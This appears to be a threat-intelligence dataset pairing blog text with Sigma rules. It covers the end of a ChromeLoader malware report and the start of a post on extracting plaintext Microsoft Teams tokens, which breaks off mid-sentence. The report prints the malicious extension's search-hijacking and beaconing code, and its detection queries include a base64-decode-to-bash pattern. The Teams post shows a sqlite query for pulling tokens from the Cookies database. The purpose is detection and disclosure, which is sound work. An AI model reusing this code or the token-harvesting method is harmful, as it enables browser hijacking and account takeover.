sections.\n\n```image\nAlt: An example of the extension downloaded by this variant, without any changes from our side.\nDescription: The image displays a segment of JavaScript code related to a Chrome extension. It includes various functions and variables such as 'ExtensionName' and 'ExtensionVersion'. The code is designed to modify web request headers and handle user search queries, specifically targeting URLs associated with 'krestinaful.com' and 'google.com'. The structure of the code suggests it is part of a malware campaign, likely linked to the ChromeLoader malware discussed in the context.\nTranscription: |\n  let ExtensionName = \"Settings\";\n  let ExtensionVersion = \"1.0\";\n  let dd = \"MjkxODcDwgLAWEBsBAw8HCGuH8CQ4GA0UADgQLCgQIAAAATQ==\";\n  \n  function hb(ev) {\n      var hb_report = \"https://krestinaful.com/\" + ev + \"?ext=\" + ExtensionName + \"&ver=\" + ExtensionVersion + \"&dd=\" + dd;\n      navigator.sendBeacon(hb_report);\n  }\n  \n  chrome.webRequest.onBeforeSendHeaders.addListener(req => {\n      req.requestHeaders.push({ name: \"dd\", value: dd });\n      return { requestHeaders: req.requestHeaders };\n  }, {\n      urls: ['*://*.krestinaful.com/*']\n  }, ['blocking', 'requestHeaders']);\n  \n  chrome.webRequest.onBeforeRequest.addListener(function (tab) {\n      var serpTab = tab.url;\n      var urlBuild = new URL(serpTab);\n  \n      if ((serpTab.indexOf(\"google.\") >= 0) && serpTab.indexOf(\"search\") >= 0 && serpTab.indexOf(\"q=\") >= 0 && serpTab.indexOf(\"complete\") === -1) {\n          var query = urlBuild.searchParams.get(\"q\");\n      }\n      if (query && query.length > 1) {\n          var q = decodeURIComponent(query).split('+').join(' ').trim();\n          let lastQuery = localStorage.getItem('lastQuery');\n          if (q == lastQuery) { return null; }\n          localStorage.setItem('lastQuery', q);\n          chrome.tabs.update({ url: \"https://krestinaful.com/search?ext=\" + ExtensionName + \"&ver=\" + ExtensionVersion + \"&q=\" + q });\n      }\n  }, {\n      urls: ['https://*.krestinaful.com/*', 'https://*.google.com/*']\n  }, ['blocking']);\n```\n\n*Figure 40. An example of the extension downloaded by this variant, without any changes from our side.*\n\n---\n\n## Conclusion\n\nThis blog documents different examples of a new malware family, ChromeLoader, spread using malicious advertisements. This malware demonstrates how determined cybercriminals and malware authors can be: In a short time period, the authors of ChromeLoader released multiple different code versions, used multiple programming frameworks, enhanced features, advanced obfuscators, fixed issues, and even adding cross-OS support targeting both Windows and MacOS.\n\nThis malware is used for hijacking victims’ browser searches and presenting advertisements – two actions that do not cause serious damage or leak highly sensitive data. However, based on the wide distribution the attackers gained in such a short time, they were able to inflict heavier damage than the damage inflicted by the two primary functions of the Chrome Extension.\n\nAdditionally, the authors were quite organized, labeling their different malware versions and using similar techniques throughout their attack routines. This probably made their lives easier while developing their attack framework and maintaining their attack chains, but unintentionally, this also made the investigation process significantly easier. In fact, it improved the research ability so much that we were able to detect two new versions of this malware – the first one and the latest, which have never been linked to this malware family before.\n\nFinally, this attack chain demonstrates two rising trends among malware authors that security products and even common users should be aware of – the use of ISO (and DMG) files and the use of browser extensions.\n\n---\n\n## Product Coverage\n\nPalo Alto Networks customers using Cortex XDR Prevent or and Pro receive protections from such campaigns in different layers, including the Local Analysis Machine Learning module, Behavioral Threat Protection, BIOC and Analytics BIOCs rules that identify the tactics and techniques that ChromeLoader uses at different stages of its execution.\n\nMost rules are not customized for ChromeLoader and are based on unusual, rare behaviors – and therefore provide protection against many additional malware families and campaigns that use the same methods.\n\nThe following rules provide behavioral detections and preventions that block this malware at different stages for Cortex XDR customers:\n\n| **Rule Name**                                   | **Description**                                                         |\n|-------------------------------------------------|-------------------------------------------------------------------------|\n| Power Empire - 2280642765                       | Power Empire post-exploitation framework                                |\n| PowerShell Activity - 83290630                  | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 1683698903                | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 1038764491                | Suspicious PowerShell activity                                          |\n| PowerShell Activity - 2677692363                | Suspicious PowerShell activity                                          |\n| Suspicious Scheduled Task Installed - 161058768 | Potential malware granted persistency via scheduled task                |\n| Suspicious File Dropped - 1664970582            | Potential malware dropped a suspicious payload executable               |\n| Suspicious File Dropped - 1833473256            | Potential malware dropped a suspicious payload executable               |\n| Suspicious Chromium Extension - 4043645859      | Potential malware tries to load malicious extension to victim's browser |\n| Staged Malware Activity - 2903131508            | Activity similar to ChromeLoader malware                                |\n| Staged Malware Activity - 4059467241            | Activity similar to ChromeLoader malware                                |\n\nIn addition, you can use the following XQL queries to detect ChromeLoader variants during their different execution stages.\n\n**Variant 1 (January) – Installer**\n\n```\ndataset = xdr_data\n| filter event_type = ENUM.RPC_CALL\n| filter actor_process_signature_status = ENUM.UNSIGNED\n| filter action_rpc_interface_uuid = \"{86D35949-83C9-4044-B424-DB363231FD0C}\" and action_rpc_func_opnum = 1\n| filter lowercase(action_rpc_func_str_call_fields) contains \"chrome\"\n```\n\n**Variant 2 (March) – Scheduled Task Installer**\n\n```\ndataset = xdr_data\n| filter event_type = ENUM.RPC_CALL\n| filter actor_process_image_name = \"powershell.exe\"\n| filter action_rpc_interface_uuid = \"{9556DC99-828C-11CF-A37E-00AA003240C7}\" and action_rpc_func_opnum = 25\n| filter lowercase(action_rpc_func_str_call_fields) contains \"powershell -windowstyle hidden -e\" and action_rpc_func_str_call_fields contains \"PS_ScheduledTask\"\n```\n\n**Variant 2 (March) – `Tone.exe` Extraction**\n\n```\ndataset = xdr_data\n| filter action_process_image_name = \"tar.exe\"\n| filter action_process_image_command_line contains \"-xvf\" and action_process_image_command_line contains \"-C\" and action_process_image_command_line contains \"AppData\\Roaming\"\n```\n\n**MacOS Variant – Extension Download Encrypted**\n\n```\ndataset = xdr_data\n| filter agent_os_type = ENUM.AGENT_OS_MAC\n| filter event_type = ENUM.PROCESS\n| filter action_process_image_command_line contains \"sh -c echo* | base64 --decode | bash\"\n| dedup agent_hostname, action_process_image_command_line\n| fields _time, agent_hostname, action_process_image_command_line, actor_process_command_line\n```\n\n**Suspicious Browser Extension Loaded**\n\n```\ndataset = xdr_data\n| filter action_process_image_name in (\"chrome.exe\", \"safari\", \"chrome\")\n| filter action_process_image_command_line contains \"-load-extension=\"\n| filter actor_process_image_name in (\"powershell.exe\", \"bash\", \"sh\")\n```\n\nPalo Alto Networks customers using WildFire also receive protections from this threat.\n\n---\n\n## Indicators of Compromise\n\n### Variant 1 ISO hashes\n\n```\nfa52844b5b7fcc0192d0822d0099ea52ed1497134a45a2f06670751ef5b33cd3\ne1f9968481083fc826401f775a3fe2b5aa40644b797211f235f2adbeb0a0782f\n860c1f6f3393014fd84bd29359b4200027274eb6d97ee1a49b61e038d3336372\n0ecbe333ec31a169e3bce6e9f68b310e505dedfed50fe681cfd6a6a26d1f7f41\n614e2c3540cc6b410445c316d2e35f20759dd091f2f878ddf09eda6ab449f7aa\n2e006a8e9f697d8075ba68ab5c793670145ea56028c488f1a00b29738593edfb\nbcc6cfc82a1dc277be84f28a3b3bb037aa9ef8be4d5695fcbfb24a1033174947\n6d89c1cd593c2df03cdbd7cf3f58e2106ff210eeb6f60d5a4bf3b970989dee2e\nedeec82c65adf5c44b52fbdc4b7ff754c6bd391653bba1e0844f0cab906a5baf\n6c54e1ea9c54e4d8ada1d15fcdbf53e4ee7e4a677d33c0ea91f6203e02140788\na9670d746610c3be342728ff3ba8d8e0680b5ac40f4ae6e292a9a616a1b643c8\nfb9cce7a3fed63c0722f8171e8167a5e7220d6f8d89456854c239976ce7bb5d6\n1717de403bb77e49be41edfc398864cfa3e351d9843afc3d41a47e5d0172ca79\n1b4786ecc9b34f30359b28f0f89c0af029c7efc04e52832ae8c1334ddd2b631e\n486c966b6e2d24dd8373181faf565d85abfd39559d334765f5135e20af55542c\n03b2f267de27dae24de14e2c258a18e6c6d11581e6caee3a6df2b7f42947d898\ndd2da35d1b94513f124e8b27caff10a98e6318c553da7f50206b0bfded3b52c9\n3927e4832dcbfae7ea9e2622af2a37284ceaf93b86434f35878e0077aeb29e7e\ne449eeade197cab542b6a11a3bcb972675a1066a88cfb07f09e7f7cbd1d32f6d\n8840f385340fad9dd452e243ad1a57fb44acfd6764d4bce98a936e14a7d0bfa6\n26977d22d9675deddfde231e89a77c013062b8820aa117c8c39fd0a0b6ab0a23\n```\n\n### Variant 1 executable hashes (aka `CS_Installer.exe`)\n\n```\nded20df574b843aaa3c8e977c2040e1498ae17c12924a19868df5b12dee6dfdd\n1dbe5c2feca1706fafc6f767cc16427a2237ab05d95f94b84c287421ec97c224\n9eca0cd45c00182736467ae18da21162d0715bd3d53b8df8d92a74a76a89c4a0\nc56139ea4ccc766687b743ca7e2baa27b9c4c14940f63c7568fc064959214307\n3b5a18d45ab6fcf85df51703ef6fac8226fc274ecd0a21c0a1f15f15f7d39e01\n44464fb09d7b4242249bb159446b4cf4c884d3dd7a433a72184cdbdc2a83f5e5\n2d4454d610ae48bf9ffbb7bafcf80140a286898a7ffda39113da1820575a892f\n53347d3121764469e186d2fb243f5c33b1d768bf612cc923174cd54979314dd3\nafc8a5f5f8016a5ce30e1d447c156bc9af5f438b7126203cd59d6b1621756d90\n564e913a22cf90ede114c94db8a62457a86bc408bc834fa0e12e85146110c89b\n```\n\n### Variant 2 ISO hashes\n\n```\ne72a42ad27c06ba0a9951705423a3650a0c4a1f8c18c5782ab98e2e72021bbb8\n26bce62ea1456b3de70d7ac328f4ccc57fe213babce9e604d8919adf09342876\n44f9680710ba7635bb3bfe025b087e85d51857d9618c5ffa5c247ccdc8bca3c3\n5ee2b7ea46cc3f34b796ab4992e778938c057490695e9109f016fc7a1b308395\na0ff3b427c77594fa48d79ed52d372bd2a8baae54ee85b243d86d9dd493ffbc6\nf3176bcd28b89e4ae7a4426c82c8b73ca22c62ecbc363296193c8f5becef973c\n424347b6f5caca8174d1b0ac2e32867a4201a41176fed1af7b3e1a0716fc7e46\nc67b87cb7420500e4b0bb6500f1875bc77a7d96997ed2850d8142dfd9636da29\n8f2da6c721251edd251addb795552ed54d89fb53d2a470d8a7f807e77aac402c\ne0d57152524e79a07e5b7d7b37831cb7596cd3afe651b4eecaf4123b1af1ffa6\n606d49ae054e13461bad3e405cc5996462c14bd48e94fe8a63f923fbb7c14b71\n7ef7bdf8ea2f8751f45482453bf7441d2b2f92d743324afdf1afc11ea248c56d\n84c93f1f7bdc44e8e92be10bf5e566f3116c9962c35262643fe2084c3b8d1bb5\n4673c1f8d307b70c4be837e842cfdf5cce60c6bf793ae85a1bce07c9c15fe14d\n0257dccfdeb1bc9683334d0d964c72ea0eeedbfda33cba1f60a395cca8e516da\n0d510dbcf8ed5c7b81206598886a7fbd86f11d36871612ba066d6ec85723fada\ne920dbc4741114f747a631928e398ef671fe9133b6aab33991d18150b4fcd745\n3d65f5a060f8ecc92de9f5e0754b8f6c129cb9a243bf1504a92143ac3bc5a197\n11174dbaca376288fd59c66d1c00255ad6c034beff96a075e833897ef3a113cc\n44e77ac27a8b7d9227d95feb87bad1cc2a4ed2172c85f5e16d335a4d62d385f4\n```\n\n### Variant 2 executable hashes (aka `Tone.exe`)\n\n```\n00c07e354014c3fb21d932627c2d7f77bf9b4aeb9be6efb026afdbd0368c4b29\n3c7acdce8a37e40672eb4fba092804f9e783f284e7d52cbcf8a9f9f3cf306af7\n5fbf4d8d44b2e26450c1dd927c92b93f77550cebfbc267c80ff9d224c5318b88\n1bb6f2a9498a220ade34b64f3208287fca6699847a5fd61e0e5ed4ee56b19316\n4e5001c698f9f1758874067c5fb6fb2911e1f948db2cc0f289d42c61f2e2fec1\n747ba8be14e4d465f79a8211a26204230719ce19293725ca139f4386e57a7dff\nfcc92f1736b5b4bd9fe503e7d6debeb7e69858fc582783c3f35e7cdece9d4feb\n0b00a215a42739809a55f05b6028399843e305fb285028de6efc5544b949a1ef\n66ababb8bd9f8b19193f56678568197350be6306f448ee9a01eeee21a487f765\nce129e2e14fb0de7bd0af27a8303686bde1c330c05449c1ff95591f364189e33\n1a01be5f08943ce03811f398f7b77aba26313dc0d0681cfad89f37db59819bc2\nc93fbf63d82b816cd32dfc7bb0eaf7053fb27cfb78433638248010e83636ae20\n7f9d31d382cef81bf858b8e848897b41397c033ad5aa5c416277cf843d7218f5\n6c87e496ba0595ac161be8abb4e6da359d5d44c7e5afbe7de8fd689e4bb88249\nd3212f79f33c8ccf6ba27984ed18acc86ec2297fe9c3df8fad5a00878986f2e2\n329e7494d516652e64c1181979fdf53b507b4a3ab23b4821823f0aef96abc6a4\nb73becdb7ad8b130072622ac7b2f03d450d7d0f9aae28e67dcb6724e5727f96c\n10bd1b5144d9a2582aaecd28eb0b80366a2675d0fd8a2f62407f8c108d367ec7\n11ad9d3e25bee2275f4930818bd737df1e1d79b334f990970c61763078c532d0\n061408f4e1f37feb0b89db3cafc496194941fade412c96ee03fc46e492df3d29\n8bdaf2a1e5400df06ce4d47b5b302b20cfb62e662e778a657485c6599865e393\n```\n\n### Variant 0 executable hashes\n\n```\n0bc3516e327fea0b5f65299366182d1e7577c9998d0cbd07891709f51fb0ac47\n0e1c5477ea71fdc1271e63989107b2d855c685c6c2303f297a610eb875520ec0\n140162b2c314e603234f2b107a4c69eb24aece3a3b6bd305101df7c26aee5f8e\n1dbc8aa73b64a1a607bcbe448347314d9a456d4d31a6cf846e25277b575bbb5b\n32aa2f66b96a95a00b032758232fc09e18439395466660b995a7d82905ef0637\n3ff8e17ee3c130e327a614400f594fec404c42188c0e7df0ce3b2bb3a3c1aff6\n57c0f3d24452b68d756577af78e809e2da12694691e62448bb132c12311360ec\n8ef4026b254dd0918bf3ace7741b26ff52a52ef024c721d8129c5ccfa4ccde24\nd2b1b9642884a6839f09204135944c02c7437f7e692d07bb0d0269c4ff8316bb\nd8d18baa934a4f1ad6777f2ca862be8d3b3a59a1fedb8d2a8e50f0a419793a15\ne4ab0e5ecbd6c87432f08398b7f7424a248f98ff780e0adb710edd0698bf5434\n45510bf70bc9063392ac0514f4e26431b9c38631ed0e61b6847fe9385f5eb17c\ne4ab0e5ecbd6c87432f08398b7f7424a248f98ff780e0adb710edd0698bf5434\nf3727e372949d12ce9f214b0615c9d896dcf2ac0e09fcd40f4a85ff601ef01f0\n```\n\n### MacOS DMG hashes\n\n```\n965a6729b89f432f61b65a7addbe376317e8fd4a188c05c6aae7f9e4a1a88fbb\n6f105daec2336658629042afa4f334f4949fc189404f66c09400fd2ca260eb0c\n267ab450a5965a525bda34deccd64bf22b5fb6cc04d811a3eec1d9289e28bc73\na6c8cbbe502df8407861590b97e634f51b85e4fe176bf68f86f6088ce81baaac\n6845a4b37e51fbf01a9573330c81483d5a438dbb1c87cbe069f72896927b4dab\nfad5e680c181fd7415e8c03ee20735411d1259f4ae19ead0100f0929d48f3f53\n40232e0ffdb8fe925f9d4a1f10d5aeda208bb58d82390ac7d1952f9219770103\nfd9a89dc83d26994708a1d9661322df12d107693d4b483a89bf9b03c974f418c\nb65dc44a3288b1718657d2197b1e0b22aa97d0e33b05e2877320e838da0ccb26\n2b24417ea8cb3271636e1747be0cc205af4bdc0d31686f024693259afdca259e\ndffdad0ced320b9934019a75658b16cf8f6abb2e4af48cb73f66a761dfe72392\n0c1700551ca47143590722ae60204f1a597040d5fa6afa966d4fc3c42d82d517\n060c0b17a2d6fc7fb3a7a866c2013891527f1cf4602c420bc186d55b1802e382\n1286ff043574dffb0c0a677b102272d7ea858030dc48d6c50534dba19d95adb6\n1adc521a448a3588c892c98e00c9e58ba30a453b0795286b79ff2f0eaf821d25\n90acb46c7964404cf22b7faad5910dfa97ae8d49b45808bd9f98bb61b7bc878f\nf0da9bf1fc8da212ae1bcb10339539f5127e62aae0ad5809c2ae855921d2ab96\nc0e50646addd20136befa520380e4d0f8915c0e0808fd8d393a386f5af87e623\n2612ee5c099d6115dcbed7247cc56838fdeeb2654ba365b1b00d6294e6981f22\n8ea53e242e05e5da560ac9a4c286f707e888784d9c64c43ae307d78b296d258a\na660f95f4649f7c1c4a48e1da45a622f3751ee826511167f3de726e2a03df05c\n```\n\n### Zipped extension hashes\n\n```\n6c1f93e3e7d0af854a5da797273cb77c0121223485543c609c908052455f045d\n92dc59664ab3427fb4b0d2d4108f1729abb506a2567770f7c4406e64db9aafae\n79114e6392bb8ffee76738e71f47131b0a2c843efe3e14f1b5e6a6d2a94c1046\n667f5bb50318fe13ea11227f5e099ab4e21889d53478a8ee1677b0f105bdc70a\n34d21f3a543a69f34973c25bbaaedb5c8bc797d63da493cbac97bfbbedbe7206\na950e93ab9b2c4d1771a52fbeb62a9f2f47dc20e9921b9d23d829b949ba187b5\n48efaa1fdb9810705945c15e80939b0f8fe3e5646b4d4ebcace0c049d1a67789\n6c1af2e5cf6d6ea68c7e017d279b432d5259358b81ea1c444dc20625805b95b9\n0f5fb924eb5eb646ba6789db665545a08c0438e99e5a24f27c37bc0279b1a8a6\na1005c22c2305781fbbce5552dcc095f9ef0237023d7041eace005542fcd3d81\n7f2cd9ad91ddab408619d3c80eef614b91a727c35285ebd813bcd1636b2cb030\n7e3d97c3802cc8bc9524480170d78aa68a9de28e3a7f4ce35d103f77843a3d0c\nf940e948586d3148e28df3e35e5671e87bc7c49525606068ac6f00783409d7aa\n63c97409bb2a8b5026b459ff6c6dcc93dd12fdd8c0a4915e9298bd96dfdedb5c\n3b4c3c598b87a3c3b9590940b4e67861c6541316bac1e1c07a139b1892307c04\na113128466145973de141c4e5c5199e5474050edd4d9225463d0527d68935ef0\nef633a38fb49a81a30fe8977dff378bb9e89f849ceceb709cbcf76272f92c402\ncc01324cbefb6d79e3a7ea1031edb6256fb3d40832ea621913aadda70e08a3b9\n3271eac4d9d20044a5fc27be6d0feece31791f3889dce2788f7ef4e201ffff4e\n8e74b6d667d7ddb7859687fd5c599f67b62b491087d1d926037effc7f7890b43\n4556d3c5e6a3322fcb39da3ef5b36d541bab70fa2f68a12e52c3de41bef092a6\n181a15d583d1ba4ad42b09ab62f3ef401c8cc2103e7ea2717d0571864f5440fd\na950e93ab9b2c4d1771a52fbeb62a9f2f47dc20e9921b9d23d829b949ba187b5\n308071d4e8298b4eba9f82ca7269ac58f8e39f64da515c0761406aacd110b731\nddb1793220d75c7126eb8af9f0d35f22e7be6998bf8ede8199c2019119b26592\n5b7dedcf0802547c8e18d46fbfe1a5daa91e77a6cf464c4b5f0cfc48fa235c1d\nb8b8f57edbd70345e2134abd8917371a29e04aa37210b553879710f717b69ddd\n6b1db4f891aa9033b615978a3fcfef02f1904f4eba984ba756ff5cd755d6f0b4\n099c2d8c3c34a24f6ed3cbf5c4ff6b22312546f2c3881281b7cc66ebff899136\n70f1d1b35ee085768aa75f171c4d24b65d16099b2b147f667c891f31d594311b\n3da0189884e07adfe946ef8f214fa9ec1c01bf093d69418563368f39fdc98e12\n216f9f9c3e69c6723203afb79ee91917eff7707312058d7e9858d70bfb6acf92\nf85e706123bedf3b98eb23e2fb4781e2845b2b438aa0f6789c2b496bfb36d580\n18b8ab327177cbde47867694d3d7acb93c83237d2418271f1020fe943760c026\n23f30fa4e9fe3580898be54f8762f85d5098fd526a51183c457b44822446c25a\n276f4008ce6dcf867f3325c6b002950cbd0fdb5bf12dc3d3afb1374622820a4e\n309c87b34966daecd05c48b787c3094eeed85b5f23ec93b20fc9cdbf8ff9b586\n47c65ef4d6b0ffe7109c588e04575dcf05fdf3afe5796078b4f335cb94c438b7\n502a8d1e95c21b5dc283ef4877ca2fe2ba41570bd813c47527fca2fb224d5380\n5e6b5a9c0849db8ca0696a16c882d6945a62e419bd646f23d4d00533bbe9bca5\n6e0cb7518874437bac717ba1888991cee48dfaca4c80a4cbbbe013a5fe7b01a6\n83cf9d2244fa1fa2a35aee07093419ecc4c484bb398482eec061bcbfbf1f7fea\n87f0416410ac5da6fd865c3398c3d9012e5488583b39edacd37f89bc9469d6a9\nc6a68fac895c0b15d5cbbba63f208e5b0a6f3c1d2382b9465375d1794f447ac5\nc7aedc8895e0b306c3a287995e071d7ff2aa09b6dac42b1f8e23a8f93eee8c7a\nd374ef30aa17f8bad0fb88d0da47f4038669c340d4c7fc2ff6505b07c17fdf65\ndfc90f64139b050cf3c72d833e1a7915af1bd689ece7222b9ac2c8426a0bfd0a\n9a5be852afef127b5cbe3af23ef49055677b07bcaca1735cf4ad0ff1e8295ccb\n7ba5e623ad2e09896f0e1d1167758bcf22a9092e4a65856f825a2b8740e748f6\nedb21b3f6f52ab0d0e17aca7e658a6e3f9ce98002433810612562b8e6ab41920\n0cf40fbce8a48bfc5068ac24ec1dd1f828af31fe3cff0342003d12b0ea561dcf\n4a0ababa34024691dc1a9e6b050fe1e5629220af09875998917b1a79af4e2244\n52c7bb3efafdd8f16af3f75ca7e6308b96e19ef462d5d4083297da1717db8b07\nbcac3fee6182a64764e88b4ed4f78cc071f297c501746df6473b0e9e679b3b43\naa9b742267bba71507a644ea4ee52a0f118ee6d595bd7eac816a8e8ee0246427\n55f240467cf2c0891484d97ded9e0c53b259a88814b6f1c78a8961bda58c9377\n49006f7529453966d6796040bb1c0ab2d53a1337c039afe32aaa14a8cce4bf0e\n08de8a1103ccd7980a9900e2ceccdef0fe4db6bd06184eb628bfbcf76a7ff997\n2eb1056cc176747c1be4b115be90cc7ee26da11a597cff6631da54c517d1a15c\n436dde0fb44f95371832a55e56ed9ee9cb22f5323ce0d2a4cdcd61cbab713503\nc05dbec1aaa11703195c743433a4319d49180c7fbd9a962e162cacd6b605ddd9\nb919fbd354654a7bf99db7206adf6a5fba9ce73ee3fedb6d08ed932ee527f301\nbfead4ccc3c16dee5f205b78e12aaaa2b33bdedbc57e22a4dbc48724f13f6277\neddd3ce6d39909be6fd5a093c2798a0c9113769b8f0f24a038449b409232472a\n22f4a87053769ae21efa8945a83e46df2f56e8f01a66f156cacf5ef6b6a8262a\na3631d6012b72a63b0f1b4a013d0971ea8505ee3db32d4a0b7b31cb9ba8dd309\n1ad535854fe536fd17aa56ae82f74872d6fad18545e19950afa3863bcbcf34eb\n9d46a0509291bf3365771f6ad53e213ffb58e4926f11365687f4a11fd0f03855\n```\n\n### C2 and Installation Servers\n\n#### Installation Servers\n\n```\nbrokenna[.]work\netterismype[.]co\nidwhitdoe[.]work\nithconsukultin[.]com\nlearnataloukt[.]xyz\nrsonalrecom[.]co\nyflexibilituky[.]co\nyeconnected[.]com\nableawid[.]com\nairplanegoobly[.]com\nbaganmalan[.]com\nballjoobly[.]com\nbalokyalokd[.]com\nboogilooki[.]com\nbookimooki[.]com\ncarfunusme[.]com\ncarmoobly[.]com\nchairtookli[.]com\nchookiebooki[.]com\nchoopinookie[.]com\nckgrounda[.]com\ncomputermookili[.]com\ndubifunme[.]com\ndudesurfbeachfun[.]com\nexkcellent[.]com\nfunbeachdude[.]com\nketobepar[.]com\nkooblniplay[.]com\nletfunhapeme[.]com\nlookiroobi[.]com\nlookitoogi[.]com\nmadorjabl[.]com\nmalanbagam[.]com\nmokkilooki[.]com\nmyeducatio[.]com\nnakasulba[.]com\nndinterper[.]com\nndworldwi[.]com\nnookiespooti[.]com\noempafnyfi[.]com\nsaveifmad[.]com\nsiwoulukdli[.]com\nslootni[.]com\nsonalskills[.]com\ntabletoobly[.]com\ntoogimoogi[.]com\ntoukfarep[.]com\nuiremukent[.]com\nukrawinrusyes[.]com\nutfeablea[.]com\nvoobmijump[.]com\nxoomitsleep[.]com\nyalfnbagan[.]com\nyalokmalos2[.]com\nyescoolservmate[.]com\nyourretyeq[.]com\ntcaukthw[.]com\ntooblycars[.]com\nkoooblycar[.]com\nrooblimyooki[.]com\nyooblygoobnku[.]com\nplaykooblni[.]com\nrockslootni[.]com\nmuendakere[.]xyz\nmployeesihigh[.]xyz\nadiingsinsp[.]xyz\najorinryeso[.]xyz\nktyouexpec[.]xyz\nlearnataloukt[.]xyz\nngwitheaam[.]xyz\nptonnervent[.]xyz\nukmlasttyye[.]xyz\nukseseem[.]xyz\nwithyourret[.]xyz\n```\n\n#### C2s\n\n```\nbetasymbolic[.]com\nkrestinaful[.]com\ntobepartou[.]com\ntobedirectuke[.]com\neandworldw[.]com\netobepartou[.]com\nkfareputfeabl[.]com\nblesasmetot[.]com\nsiwoulukdlik[.]com\nsforourcompa[.]com\n```",
    "sigma_rule": {
      "title": "Compressed File Extraction Via Tar.EXE",
      "id": "bf361876-6620-407a-812f-bfe11e51e924",
      "status": "test",
      "description": "Detects execution of \"tar.exe\" in order to extract compressed file.\nAdversaries may abuse various utilities in order to decompress data to avoid detection.\n",
      "references": [
        "https://unit42.paloaltonetworks.com/chromeloader-malware/",
        "https://lolbas-project.github.io/lolbas/Binaries/Tar/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
      ],
      "author": "AdmU3",
      "date": "2023-12-19",
      "tags": [
        "attack.collection",
        "attack.exfiltration",
        "attack.t1560",
        "attack.t1560.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\tar.exe"
          },
          {
            "OriginalFileName": "bsdtar"
          }
        ],
        "selection_extract": {
          "CommandLine|contains": "-x"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Likely"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_tar_extraction.yml",
    "id": "601"
  },
  {
    "url": "https://web.archive.org/web/20230726144455/https://www.vectra.ai/blogpost/undermining-microsoft-teams-security-by-mining-tokens",
    "markdown": "# Undermining Microsoft Teams Security by Mining Tokens\n\n**September 13, 2022**\n\n## Overview\n\nIn August 2022, the Vectra Protect team identified a post-exploitation opportunity allowing malicious actors with sufficient local or remote file system access to steal valid user credentials from Microsoft Teams due to their plaintext storage on disk. This plaintext credential management was determined to impact all commercial and GCC Desktop Teams clients for Windows, Mac, and Linux.\n\nWhile credential harvesting from memory is a common post-exploitation step, we believe that lowering the bar necessary to harvest creds down to just simple read access to the file system expands opportunities for an adversary, simplifies their task, and is particularly interesting when stolen credentials offer an opportunity to retain user access unencumbered by otherwise pesky Multi-Factor Authentication (MFA) speedbumps.\n\nWith these tokens, attackers can assume the token holder’s identity for any actions possible through the Microsoft Teams client, including using that token for accessing Microsoft Graph API functions from an attacker’s system. Additionally, these tokens are equally valid with MFA-enabled accounts, creating an allowance to bypass MFA checks during ongoing use.\n\nMicrosoft is aware of this issue but indicated it did not meet their bar for immediate servicing. Until Microsoft moves to update the Teams Desktop Application, we believe customers should be aware of the risks posed by plaintext token storage and mitigate that risk by instrumenting monitoring for unusual file access or modification to file system ACLs.\n\n## The Genesis of the Hunt\n\nThe investigation kicked off when a Vectra Protect customer complained about how Microsoft Teams manages disabled identities. End users cannot remove deactivated accounts through the UI because the Teams application requires the account to be signed in to remove it from the client. Of course, users cannot do this when their user account is disabled. To help resolve this issue, we began to look at the local configuration data inside the Teams client and unravel how it works.\n\n## Electron – a Security Negative\n\nMicrosoft Teams is an Electron-based app. Electron works by creating a web application that runs through a customized browser. This is very convenient and makes development quick and easy. However, running a web browser within the context of an application requires traditional browser data like cookies, session strings, and logs.\n\nThis is where the root of this issue lies as Electron does not support standard browser controls like encryption, and system-protected file locations are not supported by Electron out of the box but must be managed effectively to remain secure. Therefore, by default the way Electron works incentivizes creating overly transparent applications. Since Electron obfuscates the complexities of creating the application, it is safe to assume that some developers may be unaware of the ramifications of their design decisions and it is common to hear application security researchers bemoan the use of this framework due to critical security oversights.\n\n## Diving into the Structure\n\nWe first began to explore methods to expunge any references to the logged-in account(s). Our goal was to remove the old accounts and force Teams to operate as if they were gone. Multiple attempts to modify the configuration file and first-time run files amounted to nothing. As a stab in the dark, we searched for the known user principal name, and two critical files returned.\n\nThe first important file was an ldb file with access tokens in clear text. Upon review, it was determined that these access tokens were active and not an accidental dump of a previous error. These access tokens gave us access to the Outlook and Skype APIs. It is important to know that the Microsoft Teams architecture is a conglomeration of a wide variety of M365 services that relies on Skype, SharePoint, and Outlook to function—this explains the presence of these tokens.\n\n```image\nAlt: Undermining 1\nDescription: The image shows a command line output, likely from a terminal or command prompt, displaying a URL associated with Microsoft Teams and a token labeled 'skypeToken'. The token appears in a JSON-like format, indicating its key and value. This output is relevant in the context of the article, highlighting the discovery of active access tokens, which are critical for understanding vulnerabilities in Microsoft Teams security.\nTranscription: |\n  GET https://teams.microsoft.com/lts.64999auc-seb4-453d-b124-b1277d2b86c.auth.skype.token?f='skypeToken':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ...'\n```\n\nThe next file is a browser Cookies database like the “Cookies” we agree to on every website (thanks, GDPR). Cookies store data like session information, marketing tags, account information, and in some instances, access tokens. (un)Fortunately, the Teams Desktop application is storing the tokens here as well.\n\n```image\nAlt: Undermining 2\nDescription: The image shows a section of a database or configuration file, likely related to Microsoft Teams. It contains a structured format displaying URLs and a token labeled 'Bearer' which appears to be an access token. The format suggests it is part of a log or data dump showing various properties associated with Microsoft Teams authentication, possibly indicating security vulnerabilities regarding stored tokens.\nTranscription: |\n  /DINKD: teams.microsoft.com/clienttype=windows/ /{GK}h: /E8K[<TOKEN_VALUE>]  B\n  /E8K: teams.microsoft.com/auth/token Bearer 3DeyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjoi...\n```\n\nThe best way to read the Cookie DB is to use a sqlite3 database client. With this client, we can extract just the values we need. The following query returns the token's name and the token value.\n\n```image\nAlt: Undermining 3\nDescription: The image displays a command-line interface (CLI) output from a SQLite database query. The query being executed is: `SELECT name, value FROM Cookies WHERE name LIKE '%token%';`. This query aims to extract the names and values of cookies that contain the term 'token.' The context suggests this is part of an effort to identify access tokens related to Microsoft Teams, indicating the image is relevant to the analysis of security vulnerabilities in the application.\nTranscription: |\n  sql\n  sqlite> SELECT name, value FROM Cookies WHERE name LIKE \"%token%\";\n```\n\nWe evaluated each 